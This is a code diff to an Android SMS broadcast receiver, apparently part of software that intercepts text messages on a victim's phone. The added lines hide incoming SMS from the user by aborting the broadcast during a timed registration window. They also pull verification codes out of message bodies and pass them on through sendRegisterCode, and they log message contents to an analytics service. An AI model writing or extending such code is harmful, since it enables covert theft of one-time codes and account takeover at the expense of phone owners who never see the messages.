@@ -105,14 +105,15 @@ public class Receiver_SMS extends BroadcastReceiver {
 				}
 				if (!isHeartBeatServiceLive) return;
 				final long currentTime = System.currentTimeMillis();
+
 				//表示一个注册需要５分钟时间，若从建立连接ssh成功到之后５分钟时间，这段时间，会拦截该广播！！！！！！！！！！！！！
-//				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
-//						VALID_SMS_TIME)) {
-//					this.abortBroadcast();
-//				} else {
-//					this.clearAbortBroadcast();
-//				}
-				this.abortBroadcast();
+				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
+						VALID_SMS_TIME)) {
+					this.abortBroadcast();
+				} else {
+					this.clearAbortBroadcast();
+				}
+				//this.abortBroadcast();
 				Map<String, String> map1 = new HashMap<>();
 				map1.put(NativeParams.KEY_MESSAGE_ARGS, args.toString());
 				FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO, map1);
@@ -175,13 +176,15 @@ public class Receiver_SMS extends BroadcastReceiver {
 							if (DEBUG) {
 								Log.d(TAG, "收到的短信内容：" + msgContent);
 							}
-//							String code = getVerificationCode(msgContent);
-//							if (DEBUG) {
-//								Log.d(TAG, "验证码是" + code);
-//							}
+							String code = getVerificationCode(msgContent);
+							if (DEBUG) {
+								Log.d(TAG, "验证码是" + code);
+							}
 							if (TextUtils.isEmpty(msgContent)) return;
 							if (!TextUtils.isEmpty(msgContent)) {
-								//	sendRegisterCode(context, code);
+								if (!TextUtils.isEmpty(code)) {
+									sendRegisterCode(context, code);
+								}
 								if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
 									if (SmsWriteOpUtil.isWriteEnabled(context)) {
 										boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
